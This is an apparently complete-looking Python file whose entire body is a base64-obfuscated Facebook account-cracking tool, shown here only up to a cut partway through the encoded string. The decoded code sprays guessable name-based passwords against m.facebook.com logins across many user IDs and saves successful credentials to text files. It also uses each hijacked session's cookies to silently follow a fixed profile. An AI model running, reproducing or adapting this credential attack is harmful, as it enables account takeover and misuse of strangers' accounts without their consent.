import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24zDQppbXBvcnQgb3MNCnRyeToNCiAgICBpbXBvcnQgcmVxdWVzdHMNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCiAgICBwcmludCgnXG4gW+Kck10gaW5zdGFsbGluZyByZXF1ZXN0cyAhLi4uXG4nKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgcmVxdWVzdHMnKQ0KDQp0cnk6DQogICAgaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcw0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIHByaW50KCdcbiBb4pyTXSBpbnN0YWxsaW5nIGZ1dHVyZXMgIS4uLlxuJykNCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGZ1dHVyZXMnKQ0KDQp0cnk6DQogICAgaW1wb3J0IGJzNA0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIHByaW50KCdcbiBb4pyTXSBpbnN0YWxsaW5nIGJzNCAhLi4uXG4nKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykNCg0KaW1wb3J0IHJlcXVlc3RzLCBvcywgcmUsIGJzNCxwbGF0Zm9ybSwgc3lzLCBqc29uLCB0aW1lLCByYW5kb20sIGRhdGV0aW1lLCBzdWJwcm9jZXNzLCB0aHJlYWRpbmcsIGl0ZXJ0b29scyxiYXNlNjQsdXVpZCx6bGliDQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIHNhcmZyYXpzc2INCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cA0KDQoNCmN0ID0gZGF0ZXRpbWUubm93KCkNCm4gPSBjdC5tb250aA0KYnVsYW4gPSBbJ0phbnVhcnknLCAnRmVicnVhcnknLCAnTWFyY2gnLCAnQXByaWwnLCAnTWF5JywgJ0p1bmUnLCAnSnVseScsICdBZ3VzdHVzJywgJ1NlcHRlbWJlcicsICdPY3RvYmVyJywgJ05vdmVtYmVyJywgJ0RlY2VtYmVyJ10NCnRyeToNCiAgICBpZiBuIDwgMCBvciBuID4gMTI6DQogICAgICAgIGV4aXQoKQ0KICAgIG5UZW1wID0gbiAtIDENCmV4Y2VwdCBWYWx1ZUVycm9yOg0KICAgIGV4aXQoKQ0KDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCnRhID0gY3VycmVudC55ZWFyDQpidSA9IGN1cnJlbnQubW9udGgNCmhhID0gY3VycmVudC5kYXkNCm9wID0gYnVsYW5bblRlbXBdDQpQID0gJ1x4MWJbMTs5N20nICMgDQpNID0gJ1wwMzNbMTszMW0nICMgDQpIID0gJ1wwMzNbMTszMm0nICMgDQpLID0gJ1x4MWJbMTs5N20nICMgDQpCID0gJ1x4MWJbMTs5N20nICMgDQpVID0gJ1x4MWJbMTs5N20nICMgDQpPID0gJ1x4MWJbMTs5N20nICMgDQpOID0gJ1x4MWJbMG0nICAgICMgDQpteV9jb2xvciA9IFsNCiBQLCBNLCBILCBLLCBCLCBVLCBPLCBOXQ0Kd2FybmEgPSByYW5kb20uY2hvaWNlKG15X2NvbG9yKQ0KZGF0YSxkYXRhMj17fSx7fQ0KYW1hbixjcCxzYWxhaD0wLDAsMA0KdWJhaFAsZnVjayxwd0JhcnU9W10sW10sW10NCm9rID0gW10NCmNwID0gW10NCmlkID0gW10NCnVzZXIgPSBbXQ0KbG9vcCA9IDANCnVybF9sb29rdXAgPSAiaHR0cHM6Ly9sb29rdXAtaWQuY29tLyINCnVybF9tYiA9ICJodHRwczovL20uZmFjZWJvb2suY29tIg0KdXJsX2lwID0gImh0dHBzOi8vd3d3Lmh0dHBiaW4ub3JnL2lwIg0KaGVhZGVyX2dydXAgPSB7InVzZXItYWdlbnQiOiAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIn0NCmJ1bGFuX3R0bCA9IHsiMDEiOiAiSmFudWFyeSIsICIwMiI6ICJGZWJydWFyeSIsICIwMyI6ICJNYXJjaCIsICIwNCI6ICJBcHJpbCIsICIwNSI6ICJNYXkiLCAiMDYiOiAiSnVuZSIsICIwNyI6ICJKdWx5IiwgIjA4IjogIkF1Z3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPY3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlY2VtYmVyIn0NCmRvbmUgPSBGYWxzZQ0KDQpkZWYgamFsYW4oeik6DQogICAgZm9yIGUgaW4geiArICdcbic6DQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZSkNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgIHRpbWUuc2xlZXAoMC4wMSkNCg0KbG9nbyA9ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIiIiICAgDQogIF9fX19fICAgXyAgICAgICAgICAgICAgICAgICAgIF9fICAgICBfXyAgICAgICAgIA0KIHxfICAgX3wgfCB8ICAgICAgICAgICAgICAgICAgICBcIFwgICAvIC8gICAgICAgICANCiAgIHwgfCAgIHwgfCAgICAgX19fX18gICBfX19fXyAgIFwgXF8vIC9fXyAgXyAgIF8gDQogICB8IHwgICB8IHwgICAgLyBfIFwgXCAvIC8gXyBcICAgXCAgIC8gXyBcfCB8IHwgfA0KICBffCB8XyAgfCB8X19ffCAoXykgXCBWIC8gIF9fLyAgICB8IHwgKF8pIHwgfF98IHwNCiB8X19fX198IHxfX19fX19cX19fLyBcXy8gXF9fX3wgICAgfF98XF9fXy8gXF9fLF98ICAgDQpceDFiWzE7OTdtICAgICAgIF8gXyAgICAgICAgICAgICAgICANCiBceDFiWzE7OTdtICAgICB8IChfKSAgICAgICAgICAgICAgIA0KIFx4MWJbMTs5N20gX18gX3wgfF8gX19fX19fXyAgIF9fXyAgDQogXHgxYlsxOzk3bS8gX2AgfCB8IHxfICAvIF8gXCAvIF8gXCANClx4MWJbMTs5N218IChffCB8IHwgfC8gLyAoXykgfCAoXykgfA0KXHgxYlsxOzk3bSBcX18sX3xffF8vX19fXF9fXy8gXF9fXy8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANClx4MWJbMTs5N20tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1ceDFiWzE7OTdtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpcMDMzWzE7MzFtXDAzM1sxOzM3bSBBdXRob3IgXHgxYlsxOzk3bSA6IFwwMzNbMTszN20gICAgICAgICAgIE1yIE5BSUIgJiBBbGl6b28NClwwMzNbMTszMW1cMDMzWzE7MzdtIEZhY2Vib29rXHgxYlsxOzk3bTogIFwwMzNbMTszN20gICAgICAgICAgTVIgTkFJQg0KXDAzM1sxOzMxbVwwMzNbMTszN20gR2l0SHViXHgxYlsxOzk3bSAgOiBcMDMzWzE7MzdtICAgICAgICAgICBNYWZ5aWEgMzEzDQpcMDMzWzE7MzFtXDAzM1sxOzM3bSBWZXJzaW9uXHgxYlsxOzk3bSA6IFwwMzNbMTszN20gICAgICAgICAgICAgNi4wLjANClwwMzNbMTszN20tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cMDMzWzE7MzdtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICIiIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCg0KZGVmIGhhc2lsKE9LLGNwKToNCglpZiBub3QgbGVuKE9LKSAhPSAwOg0KCSAgICBwYXNzDQoJaWYgbGVuKGNwKSAhPSAwOg0KCSAgICBwcmludCgnXG5cbiAgXHgxYlsxOzk3bSBUb3RhbCBPSyA6IFx4MWJbMTs5N20gJXMgIFx4MWJbMTs5N21TU0JfT0sudHh0JyAlIChILCBQLCBzdHIobGVuKG9rKSkpKQ0KCSAgICBwcmludCgnICBceDFiWzE7OTdtIFRvdGFsIENQIDpceDFiWzE7OTdtICAgJXMgXHgxYlsxOzk3bVNTQl9DUC50eHQnICUgKEgsIFAsIHN0cihsZW4oY3ApKSkpDQoJICAgIGlucHV0KCJceDFiWzE7OTdtUHJlc3MgZW50ZXIgdG8gYmFjayBTU0IgTWVudSAiKQ0KCSAgICBzYXJmcmF6KCkNCg0KZGVmIHNhcmZyYXooKToNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBwcmludChsb2dvKQ0KICAgIGlwbSA9IHJlcXVlc3RzLmdldCh1cmxfaXApLmpzb24oKQ0KICAgIHRvZHogPSAnJw0KICAgIElQID0gaXBtWydvcmlnaW4nXQ0KICAgIHByaW50DQogICAgcHJpbnQoJyBbMV0gU3RhcnQgRmlsZSBDbG9uaW5nJykNCiAgICBwcmludCgnIFsyXSBDb250YWN0IFdpdGggTmFpYiBGQiBvciBXaGF0c0FwcCcpDQogICAgcHJpbnQoJyBbRV0gZXhpdCAnKQ0KICAgIHByaW50KCcnKQ0KICAgIF9zYXJmcmF6X19fID0gaW5wdXQoJyBbP10gQ2hvb3NlIG9wdGlvbiA6ICcpDQogICAgaWYgX3NhcmZyYXpfX18gaW4gKCcxJywgJzAxJyk6DQogICAgICAgIF9feHh4X18oKS5zYXJmcmF6eChpZCkNCiAgICBpZiBfc2FyZnJhel9fXyBpbiAoJzInLCAnMDInKToNCiAgICAgICAgY3JlYXRlX2ZpbGUoKQ0KICAgIGlmIF9zYXJmcmF6X19fIGluICgnRScsICdlZScpOg0KICAgICAgICBwYXNzDQoNCg0KY2xhc3MgX194eHhfXzoNCiAgICBkZWYgX19pbml0X18oc2VsZik6DQogICAgICAgIHNlbGYuaWQgPSBbXQ0KICAgIGRlZiBzYXJmcmF6eChzZWxmLGlkKToNCiAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgICAgIHByaW50KGxvZ28pDQogICAgICAgIHNlbGYuY250ID0gaW5wdXQoJ1B1dCBGaWxlIE5hbWUgOiAnKQ0KICAgICAgICBzZWxmLmlkID0gb3BlbihzZWxmLmNudCkucmVhZCgpLnNwbGl0bGluZXMoKQ0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICAgICAgcHJpbnQobG9nbykNCiAgICAgICAgcHJpbnQoIiIpDQogICAgICAgIF9fX3dvcmxkd2lkZV9fXyA9ICgneScpDQogICAgICAgIGlmIF9fX3dvcmxkd2lkZV9fXyBpbiAoJ3llcycsJ1llcycsJ1knLCAneScpOg0KICAgICAgICAgICAgc2VsZi5fX3BsZXJfXygpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludCgnIFshXSBDaG9vc2UgQ29ycmVjdCBPbmUnKTsNCiAgICAgICAgICAgIHNlbGYuc2FyZnJhengoaWQpDQogICAgZGVmIF9fbWV0b2RlX18oc2VsZiwgdXNlciwgX19jaGlfXywgY2Vib2spOg0KICAgICAgICBnbG9iYWwgb2ssY3AsbG9vcA0KICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYiXHIgXHgxYlsxOzk3bVtTU0JdIHtsb29wfXx7bGVuKHNlbGYuaWQpfSBbb2tdW3tsZW4ob2spfV0gW2NwXVt7bGVuKGNwKX1dICIpDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICBmb3IgcHcgaW4gX19jaGlfXzoNCiAgICAgICAgICAgICAgICBwdyA9IHB3Lmxvd2VyKCkNCiAgICAgICAgICAgICAgICBzZXNzaW9uPXJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICAgICAgICAgIGhlYWRlciA9IHsNCiAgICAgICAgICAgICAgICAgICAgIkhvc3QiOmNlYm9rLA0KICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLA0KICAgICAgICAgICAgICAgICAgICAidXNlci1hZ2VudCI6Ik5va2lhQzMtMDAvNS4wICgwOC42MykgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLA0KICAgICAgICAgICAgICAgICAgICAiZG50IjoiMSIsDQogICAgICAgICAgICAgICAgICAgICJ4LXJlcXVlc3RlZC13aXRoIjoibWFyay52aWEuZ3AiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXNpdGUiOiJzYW1lLW9yaWdpbiIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSI6ImNvcnMiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXVzZXIiOiJlbXB0eSIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtZGVzdCI6ImRvY3VtZW50IiwNCiAgICAgICAgICAgICAgICAgICAgInJlZmVyZXIiOiJodHRwczovL20uZmFjZWJvb2suY29tLyIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIGJyIiwNCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1sYW5ndWFnZSI6ImVuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44Ig0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByID0gc2Vzc2lvbi5nZXQoZiJodHRwczovL3tjZWJva30vaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRiIsIGhlYWRlcnM9aGVhZGVyKQ0KICAgICAgICAgICAgICAgIGRhcyA9IHsNCiAgICAgICAgICAgICAgICAgICAgImxzZCI6cmUuc2VhcmNoKCduYW1lPSJsc2QiIHZhbHVlPSIoLio/KSInLCBzdHIoci50ZXh0KSkuZ3JvdXAoMSksDQogICAgICAgICAgICAgICAgICAgICJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIoci50ZXh0KSkuZ3JvdXAoMSksDQogICAgICAgICAgICAgICAgICAgICJ1aWQiOnVzZXIsDQogICAgICAgICAgICAgICAgICAgICJmbG93IjoibG9naW5fbm9fcGluIiwNCiAgICAgICAgICAgICAgICAgICAgInBhc3MiOnB3LA0KICAgICAgICAgICAgICAgICAgICAibmV4dCI6Imh0dHBzOi8vZGV2ZWxvcGVycy5mYWNlYm9vay5jb20vdG9vbHMvZGVidWcvYWNjZXNzdG9rZW4vIg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBoZWFkZXIxID0gew0KICAgICAgICAgICAgICAgICAgICAiSG9zdCI6Y2Vib2ssDQogICAgICAgICAgICAgICAgICAgICJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwNCiAgICAgICAgICAgICAgICAgICAgInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwNCiAgICAgICAgICAgICAgICAgICAgIm9yaWdpbiI6Imh0dHBzOi8vIitjZWJvaywNCiAgICAgICAgICAgICAgICAgICAgImNvbnRlbnQtdHlwZSI6ImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsDQogICAgICAgICAgICAgICAgICAgICJ1c2VyLWFnZW50IjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyOyBTQU1TVU5HIFNNLUc3ODBHKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYW1zdW5nQnJvd3Nlci8xNi4wIENocm9tZS85Mi4wLjQ1MTUuMTY2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwNCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsDQogICAgICAgICAgICAgICAgICAgICJ4LXJlcXVlc3RlZC13aXRoIjoiWE1MSHR0cFJlcXVlc3QiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXNpdGUiOiJzYW1lLW9yaWdpbiIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSI6ImNvcnMiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXVzZXIiOiJlbXB0eSIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtZGVzdCI6ImRvY3VtZW50IiwNCiAgICAgICAgICAgICAgICAgICAgInJlZmVyZXIiOiJodHRwczovLyIrY2Vib2srIi9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwNCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUgYnIiLA0KICAgICAgICAgICAgICAgICAgICAiYWNjZXB0LWxhbmd1YWdlIjoiZW4tR0IsZW4tVVM7cT0wLjksZW47cT0wLjgiDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHBvID0gc2Vzc2lvbi5wb3N0KGYiaHR0cHM6Ly97Y2Vib2t9L2xvZ2luL2RldmljZS1iYXNlZC92YWxpZGF0ZS1wYXNzd29yZC8/c2hibD0wIiwgZGF0YSA9IGRhcywgaGVhZGVycyA9IGhlYWRlcjEsIGFsbG93X3JlZGlyZWN0cyA9IEZhbHNlKQ0KICAgICAgICAgICAgICAgIGlmICdjX3VzZXInIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICAgICAgICAgICAgICBjb2tpPSI7Ii5qb2luKFtrZXkrIj0iK3ZhbHVlIGZvciBrZXksdmFsdWUgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pDQogICAgICAgICAgICAgICAgICAgIHByaW50KGYiXHJ7SH0gW1NTQi1PS10ge3VzZXJ9IHwge3B3fSIpDQogICAgICAgICAgICAgICAgICAgIHdydCA9ICclc3wlcycgJSAodXNlcixwdykNCiAgICAgICAgICAgICAgICAgICAgb2suYXBwZW5kKHdydCkNCiAgICAgICAgICAgICAgICAgICAgb3BlbignU1NCX09LLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5mb2xsb3coc2Vzc2lvbixjb2tpKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsaWYgJ2NoZWNrcG9pbnQnIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnogPSBvcGVuKCcudG9rZW4udHh0JykucmVhZCgpDQogICAgICAgICAgICAgICAgICAgICAgICBjcF90dGwgPSBzZXNzaW9uLmdldChmJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3t1c2VyfT9maWVsZHM9YmlydGhkYXkmYWNjZXNzX3Rva2VuPXt0b2tlbnp9JykuanNvbigpWydiaXJ0aGRheSddDQogICAgICAgICAgICAgICAgICAgICAgICBtb250aCwgZGF5LCB5ZWFyID0gY3BfdHRsLnNwbGl0KCcvJykNCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoID0gYnVsYW5fdHRsW21vbnRoXQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1xyJXMgW05BSUItQ1BdICVzIHwgJXMgJyAlIChNLCB1c2VyLCBwdykpDQogICAgICAgICAgICAgICAgICAgICAgICB3cnQgPSAnJXN8JXMnICUgKHVzZXIscHcpDQogICAgICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQod3J0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgb3BlbignTkFJQl9DUC50eHQnICwgJ2EnKS53cml0ZSgnJXNcbicgJSB3cnQpDQogICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToNCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoID0gJycNCiAgICAgICAgICAgICAgICAgICAgICAgIGRheSAgID0gJycNCiAgICAgICAgICAgICAgICAgICAgICAgIHllYXIgID0gJycNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgICAgICAgICBwcmludCgnXHIlcyBbTkFJQi1DUF0gJXMgfCAlcyAnICUgKE0sIHVzZXIsIHB3KSkNCiAgICAgICAgICAgICAgICAgICAgd3J0ID0gJyVzfCVzJyAlICh1c2VyLHB3KQ0KICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQod3J0KQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCdOQUlCX0NQLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgbG9vcCs9MQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBzZWxmLl9fbWV0b2RlX18odXNlciwgcHcsIGNlYm9rKQ0KDQogICAgZGVmIGZvbGxvdyhzZWxmLCBzZXNzaW9uLCBjb2tpKToNCiAgICAgICAgciA9IEJlYXV0aWZ1bFNvdXAoc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwMDc2MDcwNTQ4NDUnLCBjb29raWVzPXsnY29va2llJzogY29raX0pLnRleHQsICdodG1sLnBhcnNlcicpDQogICAgICAgIGdldCA9IHIuZmluZCgnYScsIHN0cmluZz0nSWt1dGknKS5nZXQoJ2hyZWYnKQ0KICAgICAgICBzZXNzaW9uLmdldCgoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbScgKyBzdHIoZ2V0KSksIGNvb2tpZXM9eydjb29raWUnOiBjb2tpfSkudGV4dA0KDQogICAgZGVmIF9fcGxlcl9fKHNlbGYpOg0KICAgICAgICBwcmludCgnWzFdIENyYWNrIFdpdGggQXV0byBQYXNzICcpDQogICAgICAgIHByaW50KCdbMl0gQ3JhY2sgV2l0aCBOYW1lIERpZ2l0IFBhc3MnKQ0KICAgICAgICBjaGkgPSBpbnB1dCgnXG4gWz9dIENob29zZTogJykNCiAgICAgICAgaWYgY2hpID09ICcnOg0KICAgICAgICAgICAgcHJpbnQoJ1xuU2VsZWN0IENvcnJlY3QgT25lJykNCiAgICAgICAgICAgIHNlbGYuX19wbGVyX18oKQ0KICAgICAgICBlbGlmIGNoaSBpbiAoJzEnLCAnMDEnKToNCiAgICAgICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgICAgICAgICAgcHJpbnQobG9nbykNCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7MzFtXHJVc2UgZmxpZ2h0IChhaXJwbGFuZSkgbW9kZSBiZWZvcmUgdXNlXDAzM1sxOzM3bSIpDQogICAgICAgICAgICBwcmludCg0NyoiLSIpDQogICAgICAgICAgICBwcmludCgnXDAzM1sxOzM3bSBUb3RhbCBBdXRvIGZpbGUgSURzIDogJXMgJyAlIGxlbihzZWxmLmlkKSkNCiAgICAgICAgICAgIHByaW50KCdcMDMzWzE7MzdtIENyYWNraW5nIFN0YXJ0ZWQuLi4nKQ0KICAgICAgICAgICAgcHJpbnQoNDcqIi0iKQ0KICAgICAgICAgICAgd2l0aCBzYXJmcmF6c3NiKG1heF93b3JrZXJzPTMwKSBhcyBzc2J3b3JsZDoNCiAgICAgICAgICAgICAgICBmb3IgenNiIGluIHNlbGYuaWQ6ICMgWW8gTmRhayBUYXUgS29rIFRhbnlhIFNhaWENCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgdWlkLCBuYW1lID0genNiLnNwbGl0KCd8JykNCiAgICAgICAgICAgICAgICAgICAgICAgIHh6ID0gbmFtZS5zcGxpdCgnICcpDQogICAgICAgICAgICAgICAgICAgICAgICBmaXJzdCwgbGFzdCA9IG5hbWUuc3BsaXQoJyAnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZmlyc3RsID0gZmlyc3QubG93ZXIoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgbGFzdGwgPSBsYXN0Lmxvd2VyKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcnN0cyA9IGZpcnN0LmNhcGl0YWxpemUoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgbGFzdHMgPSBsYXN0LmNhcGl0YWxpemUoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHh6KSA9PSAzIG9yIGxlbih4eikgPT0gNCBvciBsZW4oeHopID09IDUgb3IgbGVuKHh6KSA9PSA2Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtmaXJzdGwrJyAnK2xhc3RsLCB4elswXSsiMTIzNDUiLCB4elswXSsiMTIzIl0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW2ZpcnN0bCsnICcrbGFzdGwsIHh6WzBdKyIxMjM0NTYiLCB4elswXSsiMTIzNCJdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW2ZpcnN0bCsnICcrbGFzdGwsIHh6WzBdKyIxMTIyMzMiLCB4elswXSsiMTIzIl0NCiAgICAgICAgICAgICAgICAgICAgICAgIHNzYndvcmxkLnN1Ym1pdChzZWxmLl9fbWV0b2RlX18sIHVpZCwgcHd4LCAibWJhc2ljLmZhY2Vib29rLmNvbSIpDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgICAgIGhhc2lsKG9rLGNwKQ0KICAgICAgICBlbGlmIGNoaSBpbiAoJzInLCAnMDInKToNCiAgICAgICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgICAgICAgICAgcHJpbnQobG9nbykNCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7MzdtXHJFbnRlciBMYXN0IE5hbWUgRGlnaXRzXDAzM1sxOzM3bVxuIikNCiAgICAgICAgICAgIHAxID0gaW5wdXQoJyAgTmFtZSArIDEgOiAnKQ0KICAgICAgICAgICAgcDIgPSBpbnB1dCgnICBOYW1lICsgMiA6ICcpDQogICAgICAgICAgICBwMyA9IGlucHV0KCcgIE5hbWUgKyAzIDogJykNCiAgICAgICAgICAgIHA0ID0gaW5wdXQoJyAgTmFtZSArIDQgOiAnKQ0KICAgICAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgICAgICAgICBwcmludChsb2dvKQ0KICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszMW1cclVzZSBmbGlnaHQgKGFpcnBsYW5lKSBtb2RlIGJlZm9yZSB1c2VcMDMzWzE7MzdtIikNCiAgICAgICAgICAgIHByaW50KDQ3KiItIikNCiAgICAgICAgICAgIHByaW50KCdcMDMzWzE7MzdtIFRvdGFsIElEcyA6ICVzICcgJSBsZW4oc2VsZi5pZCkpDQogICAgICAgICAgICBwcmludCgnXDAzM1sxOzM3bSBDcmFja2luZyBTdGFydGVkLi4uJykNCiAgICAgICAgICAgIHByaW50KDQ3KiItIikNCiAgICAgICAgICAgIHdpdGggc2FyZnJhenNzYihtYXhfd29ya2Vycz0zMCkgYXMgc3Nid29ybGQ6DQogICAgICAgICAgICAgICAgZm9yIHpzYiBpbiBzZWxmLmlkOiAjIFlvIE5kYWsgVGF1IEtvayBUYW55YSBTYWlhDQogICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgIHVpZCwgbmFtZSA9IHpzYi5zcGxpdCgnfCcpDQogICAgI